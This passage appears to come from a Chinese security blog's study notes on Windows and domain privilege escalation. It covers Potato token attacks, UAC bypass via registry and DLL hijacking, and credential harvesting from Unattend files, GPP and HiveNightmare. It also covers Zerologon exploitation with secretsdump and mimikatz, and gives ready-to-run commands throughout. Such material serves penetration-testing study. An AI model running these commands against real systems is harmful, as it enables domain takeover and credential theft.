MSSQL 服务的xp_cmdshell 成功执行了系统命令，此时获取的服务账户拥有 SeImpersonatePrivilege 和SeAssignPrimaryTokenPrivilege 特权，就可以通过 Potato 家族提升至 SYSTEM 权限。</p></blockquote><h2 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h2><p>即”烂土豆”，用于将已获取的服务账户权限提升至SYSTEM权限。</p><p>Rotten Potato 提权的实现机制相当复杂，拦截 NTLM 身份认证请求，并伪造 NT AUTHORITY\SYSTEM 账户的访问令牌，大致可以分为以下三个步骤：</p><ol><li>通过 CoGetInstanceFromIStorage API，将一个COM对象(BITS)加载到本地可控的端口(TCP 6666)，并诱骗 BITS 对象以 NT AUTHORITY\SYSTEM 账户的身份向该端口发起 NTLM 认证</li><li>借助本地RPC 135端口,对BITS对象的认证过程执行中间人攻击(NTLM Relay),同时调用相关 API为 NT AUTHORITY\SYSTEM 账户在本地生成一个访问令牌。</li><li>通过 NT AUTHORITY\SYSTEM 账户的令牌创建新进程，以获取SYSTEM 权限。</li></ol><p>现在假设已经获取IIS服务账户的WebShell，执行whoami &#x2F;priv查询当前的特权</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402093845566.png" alt="image-20240402093845566"></p><p>通过webshell上线MetaSploit，此时加载incognito不能列举出高权限用户的令牌</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402093939148.png" alt="image-20240402093939148"></p><p>接下来向目标主机上传Rotten Potato的利用程序，并通过下面命令在Meterpreter中运行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">execute -Hc -f rottenpotato.exe<br></code></pre></td></tr></table></figure><p>此时再次执行list_token -u就可以看到 高权限用户的令牌了</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402094141557.png" alt="image-20240402094141557"></p><p>然后就可以用impersonate_token伪造该令牌获取SYSTEM权限</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240402094236551.png" alt="image-20240402094236551"></p><h2 id="Juicy-Potato"><a href="#Juicy-Potato" class="headerlink" title="Juicy Potato"></a>Juicy Potato</h2><p>Juicy Potato 与 Rotten Potato 的原理几乎完全相同，只是在后者的基础上做了扩展，以便更灵活利用 Rotten Potato。Juicy Potato 不再像 Rotten Potato 那样依赖于一个现有的Meterpreter,并且可以自定义 COM 对象加载的端口,以及根据系统版本更换可用的 COM对象</p><p>还是以IIS服务演示，假设已经通过MetaSploit 获取了 IIS服务账户的权限。</p><ol><li><p>上传 JuicyPotato 的利用程序，并根据操作系统版本选择一个可用的 COM 对象。在 Rotten Potato 中使用的 COM 对象为 BITS，而 Juicy Potato 为不同 Windows 版本提供了多个可以利用的COM对象。</p><p>对于Windows Server2016，可以选择的对象有COMXblGameSave,其CLSID为{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</p></li><li><p>执行以下命令，运行 JuicyPotato，将获取 SYSTEM 权限并运行指定的攻击载荷，成功获取到了一个SYSTEM权限的Meterpreter</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">JuicyPotato.exe -t t -p &quot;C:\inetpub\wwwroot\reverse_tcp.exe&quot; -l 6666 -n 135 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-t，指定要使用 CreateProcesswithTokenW和CreateProcessAsUserA()中的哪个函数创建进程</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-p，指定要运行的程序；-l，指定COM对象加载的端口</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-n，指定本地RPC服务端口，默认为135；-c，指定COM对象的CLSID</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406110723009.png" alt="image-20240406110723009"></p></li></ol><blockquote><p>注意，以上提权方法仅适用于 Windows 10 version 1809 和 Windows Server 2019 之前版本的系统。在之后的版本中，微软通过检查RPC 绑定字符串中指定的端口来修复了这个问题，修复后的系统无法通过原来的方法实现中间人攻击。</p></blockquote><h2 id="PrintSpoofer（Pipe-Potato）"><a href="#PrintSpoofer（Pipe-Potato）" class="headerlink" title="PrintSpoofer（Pipe Potato）"></a>PrintSpoofer（Pipe Potato）</h2><p>该提权技术主要利用了打印机组件路径检查中存在的一个Bug，使高权限的服务能连接到测试人员创建的命名管道，以获取高权限账户的令牌来创建新进程。</p><p>上线MetaSploit后，向目标主机上传PipePotato利用程序，在SHELL中直接运行就会获得SYSTEM权限</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406112010157.png" alt="image-20240406112010157"></p><h2 id="Sweet-Potato"><a href="#Sweet-Potato" class="headerlink" title="Sweet Potato"></a>Sweet Potato</h2><p>集成了上面所述的功能，有机会把这些提权方法复现一下。</p><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><p>用户账户控制(User Account Control，UAC)是Windows操作系统采用的一种控制机制，可以阻止自动安装未经授权的应用并防止意外更改系统设置，有助于防止恶意软件损坏计算机。用户账户控制使应用程序和任务始终在非管理员账户的安全上下文中运行，除非管理员专门授予管理员级别的权限。开启用户账户控制后，每个需要使用管理员访问令牌的应用都必须提示征得用户同意。</p><p>UAC限制限制所有用户包括非RID 500的管理员用户使用标准用户登录到他们的计算机，并在标准用户的安全上下文中访问资源和运行应用；非RID 500指的是除了Administrator以外、位于管理员组的其他用户。</p><p>非RID 500用户登录后，系统会为他们创建两个单独的访问令牌：标准用户访问令牌和管理员访问令牌。两个令牌的用户特定信息相同，只是标准用户令牌移除了Windows管理特权和相关SID。当要执行高权限任务时，系统会自动询问是否批准，也就是平时会弹出的是否以管理员权限运行。</p><blockquote><p>Bypass UAC就是使非RID 500用户可以不需要批准直接使用管理员访问令牌。</p></blockquote><h2 id="UAC白名单"><a href="#UAC白名单" class="headerlink" title="UAC白名单"></a>UAC白名单</h2><p>微软给一些系统程序设置了白名单机制，这些程序执行高权限时不用再询问；如：slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe、rundll32.exe、explorer.exe。</p><p>对这些程序进行DLL劫持、DLL注入或者注册表劫持就可以绕过UAC。</p><p>我们可以用微软官方提供的两个工具来寻找白名单程序：Sigcheck和Strings</p><p>白名单程序的特性就是Manifest 数据中 autoElevate 属性的值为 True。</p><p>Sigcheck可以检测程序是否有autoElevate属性，以ComputerDefaults.exe示例：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sigcheck.exe /accepteula -m C:\Windows\System32\ComputerDefaults.exe<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406121105319.png" alt="image-20240406121105319"></p><p>Strings可以找出所有具有autoElevate属性的程序</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">strings.exe /accepteula -s C:\Windows\System32\*.exe | findstr /i &quot;autoElevate&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406121717543.png" alt="image-20240406121717543"></p><p>下面用ComputerDefaults.exe来进行分析，并通过该程序绕过UAC</p><ol><li><p>该程序运行后会打开Windows默认应用，而且不会出现UAC弹窗<img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406123213032.png" alt="image-20240406123213032"></p></li><li><p>使用进程监控器Process Monitor(这也是微软的官方工具)监控该程序进程的所有操作行为(主要是监控注册表和文件的操作)</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406145056963.png" alt="image-20240406145056963"></p><p>可以看到注册表的查询项和过程，我们就是利用修改查询注册表时会执行的可执行文件的路径来进行UAC绕过，书上用的注册表路径我这里没有，就记录一下绕过过程</p></li></ol><p>书上的该程序使会查询注册表的这两个进程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406145719264.png" alt="image-20240406145719264"></p><p>通常情况下，以“shell\open\command“命名的注册表中存储的可能是可执行文件的路径，所以知道后就可以修改该项的值以修改可执行文件的路径</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /d &quot;c:\Windows\System32\cmd.exe&quot; /f<br>reg add &quot;HKCU\Software\Classes\ms-settings\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;c:\Windows\System32\cmd.exe&quot; /f<br></code></pre></td></tr></table></figure><p>执行上面命令后就会在注册表HKCU\Software\Classes\ms-settings\shell\open\command（如果没有就创建）中将要执行的攻击载荷路径分别写入默认值和DelegateExecute值。标准用户对注册表键值有修改权限，并且对HKCU的修改会自动同步到HKCR</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406174941120.png" alt="image-20240406174941120"></p><p>这时候再次运行ComputerDefaults.exe时，恶意程序就会随着该程序的启动绕过UAC并以高权限运行，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406175124818.png" alt="image-20240406175124818"></p><p>上线MetaSploit之后，执行getsystem命令可直接提升至SYSTEM权限</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240406175217578.png" alt="image-20240406175217578"></p><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>DLL就是动态链接库，在程序运行的时候相关的DLL就会被加载进对应程序进程的内存空间，当我们能够通过一些手段让程序执行任意的DLL，就会造成DLL劫持。</p><p>应用程序加载DLL时，没有指定绝对路径就会以下面的路径搜索DLL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">程序安装目录==》系统目录(C:\Windows\System32)==》16位系统目录(C:\Windows\System)==》Windows目录(C:\Windows)==》当前工作目录==》PATH环境变量中列出的各目录<br></code></pre></td></tr></table></figure><p>DLL劫持的原理就是将我们的同名恶意DLL文件放在合法DLL文件的搜索路径之前，程序就会优先加载我们的恶意DLL，造成DLL劫持；利用的前提是拥有对上述目录的写入权限，并且恶意 DLL 需要与原始 DLL拥有相同的导出表函数。</p><h2 id="模拟可信任目录"><a href="#模拟可信任目录" class="headerlink" title="模拟可信任目录"></a>模拟可信任目录</h2><p>当系统允许程序自动提升权限时，需要满足下面三个条件，任何一个条件不通过都会被系统拒绝：</p><ol><li>检查可执行文件的 Manifest 信息autoElevate属性字段的值为True</li><li>检查可执行文件的签名</li><li>检查可执行文件是否位于系统可信任目录中</li></ol><p>系统在检查可信任目录时，相关函数会去掉可执行文件路径中的空格，所以我们可以借助该特性来绕过第三个条件，比如文件位于”C:\Windows \System32”。</p><blockquote><p>基于此原理，测试人员根据可信任目录来创建一个包含尾随空格的模拟可信任目录将一个白名单程序复制到模拟可信任目录中，配合 DIL劫持等技术即可成功绕过 UAC。</p></blockquote><p>大致攻击流程如下：</p><ol><li><p>先创建模拟可信任目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">md &quot;\\?\C:\Windows &quot;<br>md &quot;\\?\C:\Windows \System32&quot;<br>copy C:\Windows\System32\WinSAT.exe &quot;\\?\C:\Windows \System32\WinSAT.exe&quot; #这里复制白名单程序到模拟可信任目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">\\?\前缀是为了保证路径解析正确</span><br></code></pre></td></tr></table></figure></li><li><p>启动该白名单程序用Process Monitor检测其进程所加载的DLL</p><p>然后选择一个DLL进行劫持，注意构造的恶意DLL文件需要与原来的DLL具有相同的导出函数。可以使用**ExportsToC++**工具来获取原DLL文件导出的函数并自动生成C++代码。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410000758252.png" alt="image-20240410000758252"></p></li><li><p>简单修改生成代码，在DLLMain入口函数加入要执行的操作，然后编译生成64位的DLL文件</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410000823674.png" alt="image-20240410000823674"></p></li><li><p>将生成DLL文件放入模拟可信任目录再运行白名单程序即可。</p></li></ol><h2 id="相关辅助工具"><a href="#相关辅助工具" class="headerlink" title="相关辅助工具"></a>相关辅助工具</h2><p><strong>UACME</strong></p><p>UACME是一个专用于绕过 WindowsUAC的开源项目,目前已包含了70多种 BypassUAC的方法，项目地址：<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>在UACME项目中，每种BypassUAC 的方法都有一个数字编号，由一个名为Akagi.exe(需要自行编译生成)的主程序进行统一调用，相关命令如下:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">akagi.exe [Key] [Param]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Key，指定要使用的方法的编号</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Param，指定绕过 UAC后要运行的程序或命令，默认启动一个关闭了 UAC的 CMD 窗口</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">命令示例如下</span><br>Akagi.exe 23 C:\Windows\System32\cmd.exe<br></code></pre></td></tr></table></figure><p><strong>MetaSploit</strong></p><p>MetaSploit也有内置用于绕过UAC的模块</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410001516563.png" alt="image-20240410001516563"></p><p>成功利用这些模块，将得到一个关闭了UAC保护的 Meterpreter,然后执行 getsystem命令，可直接提升至SYSTEM权限。</p><h1 id="用户凭据操作"><a href="#用户凭据操作" class="headerlink" title="用户凭据操作"></a>用户凭据操作</h1><h2 id="枚举Unattended凭据"><a href="#枚举Unattended凭据" class="headerlink" title="枚举Unattended凭据"></a>枚举Unattended凭据</h2><p>无人值守(Unattended)安装允许应用程序在不需要管理员关注下自动安装。无人值守安装的问题是会在系统中残留一些配置文件，其中可能包含本地管理员的用户名和密码，常见的路径如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\sysprep.inf<br>C:\syspreg\sysprep.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml<br>C:\unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\PantheriUnattended.xml<br>C:\Windows\PantheriUnattendiUnattended.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\System32\Sysprep\Unattend.xml<br>C:\Windows\System32\Sysprep\PantherUnattend.xml<br></code></pre></td></tr></table></figure><p>可以全盘搜索上述配置文件，并检索User、Accounts、UserAccounts、LocalAccounts、Administrator、Password等关键字来获取管理员凭据。</p><p>MetaSploit 提供了 post&#x2F;windows&#x2F;gather&#x2F;enum_unattend 模块，可以从 Unattend 配置文件中自动化检索出用户密码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410002428433.png" alt="image-20240410002428433"></p><h2 id="获取组策略凭据"><a href="#获取组策略凭据" class="headerlink" title="获取组策略凭据"></a>获取组策略凭据</h2><p>微软在 Windows Server 2008中引入了组策略首选项，允许网络管理员对指定计算机和用户配置特定的设置。<br>在大型企业或组织的域环境中，网络管理员往往会通过下发组策略的方式对所有加入域的计算机的本地管理员密码进行批量修改。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410003626595.png" alt="image-20240410003626595"></p><p>在新建一个组策略后，域控制器会自动在SYSVOL 共享目录中生成一个XML 文件该文件保存了组策略更新后的密码。SYSVOL是在安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹，主要存放登录脚本、组策略数据及其他域控制器需要的域信息，并在所有经过身份验证的域用户活域信任用户范围内共享</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410003755692.png" alt="image-20240410003755692"></p><p>改目录中一个Groups.xml文件，其中的cpassword字段保存了AES256加密后的用户密码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410003851164.png" alt="image-20240410003851164"></p><p>但是后来微软在2012年公布了加密私钥，所以经过认证的用户都可以读取并解密出来。</p><p>MetaSploit 框架内置 post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp 模块，可以自动化搜索位于SYSVOL共享目录中的XML，并从中解密出用户密码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410004027561.png" alt="image-20240410004027561"></p><h2 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h2><p>2021年7月，Microsoft发布紧急安全公告，公开了一个Windows 提权漏洞(CVE-2021-36934)。由于 Windows中多个系统文件的访问控制列表(ACL)过于宽松使得任何标准用户都可以从系统卷影副本中读取包括SAM、SYSTEM、SECURITY 在内的多个系统文件。由于SAM 文件是存储用户密码哈希值的安全账户管理器，进而可以获取所有本地用户 NTLM Hash值，通过暴力破解或哈希传递等方法就能实现本地权限提升。</p><p>该漏洞利用需要满足三个条件：</p><ol><li>已启用系统保护(默认启用)</li><li>系统上存在已创建的系统还原点</li><li>系统启用本地管理员用户</li></ol><blockquote><p>Windows系统保护：是Windows操作系统的一个功能，旨在保护计算机的系统文件和设置免受意外更改或恶意软件的损害。它通过创建系统还原点和监控系统文件的完整性来实现这一目标。</p><p>具体来说，Windows系统保护有两个主要功能：</p><ol><li>系统还原点：Windows系统保护会定期创建系统还原点，这是计算机在某个时间点的快照。当计算机遇到问题或系统文件损坏时，可以使用系统还原点将系统还原到先前的正常状态。系统还原点记录了操作系统、驱动程序和注册表的状态，而不会影响个人文件和数据。</li><li>文件完整性监控：Windows系统保护还会监控系统文件的完整性。它会定期扫描关键系统文件，验证其完整性，并修复任何被修改或损坏的文件。这有助于防止恶意软件或用户意外更改系统文件，从而确保系统的稳定性和安全性。</li></ol></blockquote><p>满足之后标准用户即可访问和转储SAM、SYSTEM、SECURITY文件，路径一般如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\Windows\System32\config\SAM<br>C:\Windows\System32\config\SECURITY<br>C:\Windows\System32\config\SYSTEM<br></code></pre></td></tr></table></figure><p>标准用户可以执行下面命令查看是否存在漏洞：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icals C:\Windows\System32\config\SAM<br></code></pre></td></tr></table></figure><p>出现下面内容则表示存在该漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410161153281.png" alt="image-20240410161153281"></p><p>然后将HiveNightmare.exe利用程序上传到目标主机直接运行就可以将这三个文件转储到当前目录，项目地址：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410161632625.png" alt="image-20240410161632625"></p><p>最后使用Impacket 项目中的secretsdump.py导出 SAM 文件中的哈希值，项目地址：<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python secretsdump.py -sam SAM-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> -system SYSTEM-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> -security SECURITY-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> LOCAL<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410161855268.png" alt="image-20240410161855268"></p><blockquote><p>用mimikatz也一样</p></blockquote><h2 id="Zerologon域内提权"><a href="#Zerologon域内提权" class="headerlink" title="Zerologon域内提权"></a>Zerologon域内提权</h2><p>Zerologon(CVE-2020-1472)是Netlogon远程协议的一个特权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权。</p><p><strong>Netlogon协议</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Netlogon远程协议是一种用于Windows操作系统的网络通信协议，用于处理域控制器和客户端计算机之间的身份验证和授权。它是Windows域环境中的核心协议之一。<br><br>Netlogon远程协议在Windows操作系统中使用以下两个常用端口：<br><br>TCP/UDP端口 445：这是SMB（Server Message Block）协议的默认端口，Netlogon远程协议在内部使用SMB进行通信。SMB是一种用于文件和打印共享以及远程管理的协议，Netlogon利用SMB来进行域控制器和客户端之间的身份验证和授权。<br><br>TCP/UDP端口 139：这是NetBIOS（Network Basic Input/Output System）的旧版端口，Netlogon在某些旧版本的Windows操作系统中可能使用该端口进行通信。然而，从Windows Vista和Windows Server 2008开始，默认情况下，Netlogon使用SMB协议的端口445。<br></code></pre></td></tr></table></figure><p>该漏洞的最常见的利用方法是调用Netlogon中的RPC函数 NetrServerPasswordSet2来重置域控制器的密码。注意，这里重置的是域控机器账户的密码，该密码由系统随机生成，密码强度是 120个字符，并且会定时更新。</p><p>机器用户拥有域用户的一切属性，在特定意义上也是一种域用户。域内的机器账户以“机器名+$”来命名如域控制器DC-1的机器用户就是DC-1$。</p><p>但是机器账户不允许登录，因此不能重置密码后直接登录，机器账户默认情况下拥有DCSync权限，因此可以通过 DCSync攻击导出域管理员密码的哈希值，进而获取域控权限。</p><p>攻击过程：</p><ol><li><p>重置域控密码</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 cve-2020-1472-exploit.py DC-1 10.10.10.11 #将域控的密码置空，该攻击脚本可以网上查找<br></code></pre></td></tr></table></figure></li><li><p>使用 secretsdump.py以空密码连接上域控，并导出域管理员的哈希值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 secretdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot; -no-pass<br></code></pre></td></tr></table></figure></li><li><p>然后执行哈希传递攻击获取域控的SYSTEM权限</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410164025687.png" alt="image-20240410164025687"></p></li></ol><p>也可以使用mimikatz</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:Dc-1$/exploit&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/target，指定域控地址；/account，指定域控的机器账户</span><br></code></pre></td></tr></table></figure><p>攻击结束后还需要及时恢复域控密码，否则可能导致域控制器脱域。主要原因是域控 NTDS.dit 中存储的密码和域控本地注册表中存储的密码不一致。</p><ol><li><p>先导出本地注册表的值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br></code></pre></td></tr></table></figure></li><li><p>使用secretsdump.py导出注册表中的哈希值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<br></code></pre></td></tr></table></figure><p>箭头所指即当前机器用户密码</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410164855235.png" alt="image-20240410164855235"></p></li><li><p>通过运行 CVE-2020-1472 中的 restorepassword.py 恢复域控密码</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">pvthon3 restorepassword.py hack-my.com/DC-1@DC-1 -target-ip 10.10.10.11 -hexpass &lt;导出的哈希值&gt;<br></code></pre></td></tr></table></figure></li></ol><p>也可以直接使用mimikaze恢复</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lsadump::postzerologon /target:hack-my.com /account:DC-1$<br></code></pre></td></tr></table></figure><h1 id="Print-Spooler提权漏洞"><a href="#Print-Spooler提权漏洞" class="headerlink" title="Print Spooler提权漏洞"></a>Print Spooler提权漏洞</h1><p>Print Spooler 是 Windows 系统的打印后台处理服务，用来管理所有本地和网络打印队列，并控制所有打印工作。该服务在 Windows 中为默认开启状态</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410165124444.png" alt="image-20240410165124444"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240410165241804.png" alt="image-20240410165241804"></p><h2 id="PrintDemon"><a href="#PrintDemon" class="headerlink" title="PrintDemon"></a>PrintDemon</h2><p>2020年5月12日，微软发布安全更新补丁，公开了一个名为“PrintDemon”的本地提权漏洞(CVE-2020-1048)。由于 Windows Print Spooler 服务存在缺陷，用户可以在系统上写入任意文件，并可以借助其他方法提升权限。该漏洞广泛影响 Windows 系统的各版本。</p><h2 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h2><p>PrintNightmare 是广泛影响 Windows 系统各版本的严重安全漏洞，发生在 WindowsPrint Spooler 服务中，有两种变体，一种导致权限提升(CVE-2021-1675)，另一种允许远程代码执行(CVE-2021-34527)。</p><p>标准用户可以通过 PrintNightmare 漏洞绕过 PfcAddPrinterDriver 的安全验证,并在打印服务器中安装恶意的驱动程序。若当前所控制的用户在域中，则可以连接到域控制器中的 Print Spooler 服务并在域控制器中安装恶意的驱动程序，进而接管整个域环境。</p><h1 id="Certifried域内提权"><a href="#Certifried域内提权" class="headerlink" title="Certifried域内提权"></a>Certifried域内提权</h1><p>2022年5月10日，微软发布补丁修复了一个Active Directory 域权限提升漏洞(CVE-2022-26923)。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了活动目录证书服务(Active Directory Certificate Services，AD CS)服务器角色的活动目录环境中将权限提升至域管理员。</p><h2 id="活动目证书服务"><a href="#活动目证书服务" class="headerlink" title="活动目证书服务"></a>活动目证书服务</h2><p>活动目录证书服务(AD CS)是微软对PKI(PublicKey Infrastructure，公钥基本结构)的实现，与现有的活动目录森林集成，并提供从加密文件系统到数字签名，再到客户端身份验证等一切功能。虽然默认情况下没有为活动目录环境安装活动目录证书服务，但活动目录证书服务如今已在各大企业和组织中被广泛部署。</p><p>PKI 是用来实现证书的产生、管理、存储、分发和撤销等功能，可以理解为一套解决方案，其中需要有证书颁发机构，具有证书发布、证书撤掉等功能。</p><h2 id="活动目录证书注册流程"><a href="#活动目录证书注册流程" class="headerlink" title="活动目录证书注册流程"></a>活动目录证书注册流程</h2><p>要从活动目录证书服务(ADCS)获取证书，客户端需经过注册流程</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240411002111319.png" alt="image-20240411002111319"></p><p><strong>CA证书是什么</strong></p><p>CA证书是由权威的数字证书授权中心（Certification Authority，简称CA）签发的一种数字证书。CA证书用于验证和确认公钥的所有者身份，确保通信的安全性和可信度。</p><p><strong>CA证书包含以下关键信息：</strong></p><ol><li>公钥：CA证书包含一个公钥，用于加密和验证数字签名。</li><li>主体信息：CA证书中包含证书的拥有者（通常是个人、组织或设备）的身份信息，如姓名、组织名称、电子邮件地址等。</li><li>有效期：CA证书具有一个指定的有效期，即证书的生效日期和过期日期。在有效期内，证书可以用于加密、解密和验证数字签名。</li><li>签名算法和签名值：CA使用其私钥对证书的信息进行数字签名，以确保证书的完整性和真实性。证书中包含了签名值和用于生成签名的算法信息。</li></ol><p><strong>CA证书的工作原理如下：</strong></p><ol><li>证书请求：申请者生成一个证书请求（Certificate Signing Request，简称CSR），包含其公钥和身份信息。CSR提交给CA以申请证书。</li><li>CA验证：CA对申请者的身份进行验证，并确认其公钥的真实性。验证可以通过多种方式进行，如身份验证、域名验证等。</li><li>签发证书：经过验证后，CA使用自己的私钥对证书请求进行数字签名，生成最终的CA证书。</li><li>证书分发：CA将签发的证书发送给申请者。申请者可以将该证书用于加密通信、数字签名验证等操作。</li></ol><blockquote><p>CA证书的作用是建立数字身份和建立信任链。由于CA是被广泛认可和信任的权威机构，其签发的证书能够验证证书持有者的身份，确保通信的安全性和可信度。客户端可以验证服务器的CA证书，确保与其通信的服务器是合法和可信赖的。</p><p>在Web安全领域，CA证书也用于HTTPS协议，用于验证网站的真实性和建立安全的加密通信通道。</p></blockquote><p><strong>注册流程</strong></p><p>概括地说，在注册期间，客户端首先根据活动目录Enrollment Services 容器中的对象找到企业 CA，然后生成一个公钥&#x2F;私钥对，并将公钥、证书主题和证书模板名称等其他详细信息一起放入证书签名请求(Certificate SigningRequest，CSR)消息。客户端使用其私钥签署 CSR，并将 CSR发送到企业 CA 服务器。CA 服务器检查客户端是否可以请求证书，如果是，就会通过查找CSR 中指定的证书模板 AD 对象来确定是否会颁发证书CA 将检查证书模板 AD对象的权限是否允许该账户获取证书，如果是，就将使用证书模板定义的“蓝图”设置(如EKU、加密设置和颁发要求等)并使用 CSR中提供的其他信息(如果证书的模板设置允许)生成证书。CA使用其私钥签署证书，然后返回给客户端。</p><p>CA 颁发的证书可以提供加密(如加密文件系统)、数字签名(如代码签名)和身份验证(如对AD)等服务。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-端口转发和代理</title>
      <link href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/"/>
      <url>/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/</url>
      
